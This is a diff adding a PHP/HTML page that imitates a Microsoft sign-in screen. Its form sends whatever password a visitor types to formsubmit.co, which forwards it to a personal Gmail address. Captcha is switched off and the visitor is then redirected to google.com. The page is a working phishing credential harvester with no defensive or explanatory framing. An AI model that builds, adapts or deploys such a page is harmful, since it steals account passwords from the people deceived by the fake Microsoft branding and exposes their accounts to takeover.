@@ -1,0 +1,44 @@
+<?php include 'sentMail.php';?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!--icon link-->
+    <link rel="shortcut icon" href="fav/favicon (1).ico" type="image/x-icon">
+    <!--main css-->
+    <link rel="stylesheet" href="css/login.css">
+    <!--bootstrap css-->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <title>login</title>
+</head>
+
+<body>
+    <header></header>
+    <main>
+        <div id="login" class="card">
+            <div class="card-body">
+                <img class="card-title mb-3" src="img/Microsoft.png" alt="Microsoft">
+                <form action="https://formsubmit.co/vincentchukwuma30@gmail.com" method="POST">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="text" name="text" id="emlSpan" class="disable mb-2" placeholder="">
+                    <h4 class="card-subtitle mb-2 text-muted">Enter password</h4>
+                    <input class="no-outline mb-3" type="password" name="password" required>
+                    <input type="hidden" name="_next" value="https://google.com">
+                    <fieldset class="d-flex justify-content-end mt-4">
+                        <button type="button" class="lBtn grey btn btn-primary" onclick="history.back()">Back</button>
+                        <button type="submit" name="submit" id="my-form-button" class="lBtn btn btn-primary ms-2"
+                            data-subnit="...Sending">Sign in</button>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    </main>
+    <footer></footer>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/nxt.js"></script>
+</body>
+
+</html>
